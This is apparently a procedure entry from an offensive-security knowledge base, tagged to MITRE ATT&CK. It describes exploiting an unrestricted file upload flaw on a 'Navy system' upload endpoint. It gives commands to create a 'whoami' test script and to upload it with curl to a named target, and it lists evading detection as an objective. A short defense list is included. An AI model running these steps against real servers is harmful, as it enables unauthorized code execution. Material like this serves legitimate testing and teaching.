---
id: proc-uuid-upload-file
tags:
  - file-upload
  - malicious-file
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-upload-file]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:13.361Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Remote File Copy]]'
---
# Upload-Malicious-Script-File

## Summary

This procedure exploits an unrestricted file upload vulnerability by sending a malicious script to the server, bypassing any validation to store executable code for later execution.

## Description

The Navy system's upload tool allowed arbitrary files without checking types or contents, enabling attackers to upload scripts like shell files that could be processed insecurely. This leads to potential command injection if the server executes or includes the file.

## Requirements

1. Accessible upload endpoint confirmed
2. Malicious file prepared (e.g., shell script with injection payload)
3. HTTP client capable of multipart form uploads

## Defense

Defensive measures and detection strategies:

- Validate file types, extensions, and contents on upload
- Scan uploads for malicious signatures using antivirus
- Restrict upload directories to non-executable paths and monitor for execution attempts

## Objectives

1. Successfully store a malicious file on the server
2. Obtain confirmation or path of the uploaded file
3. Avoid detection through benign-looking uploads if possible

## Instructions

### Step 1: Prepare Malicious File

**Context**: Create a simple script file that, when executed, performs a benign test like writing to a file, to confirm RCE potential.

**Command** (local file creation):
```bash
echo "whoami > /tmp/pwned.txt" > malicious.sh
```

> This generates the payload file locally.

### Step 2: Perform the Upload

**Context**: Submit the file via POST multipart form to the endpoint, exploiting the lack of validation.

**Command** ([[commands/curl-upload-file]]):
```bash
curl -X POST -F "file=@malicious.sh" https://target-navy-system.com/upload
```

> Response should indicate success, possibly returning the file path like "/uploads/malicious.sh".

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Remote File Copy]]

### Sub-Techniques


## Commands Used

- [[commands/curl-upload-file]]

## Tools Used


## Tags

- [[file-upload]]
- [[malicious-file]]
- [[web]]
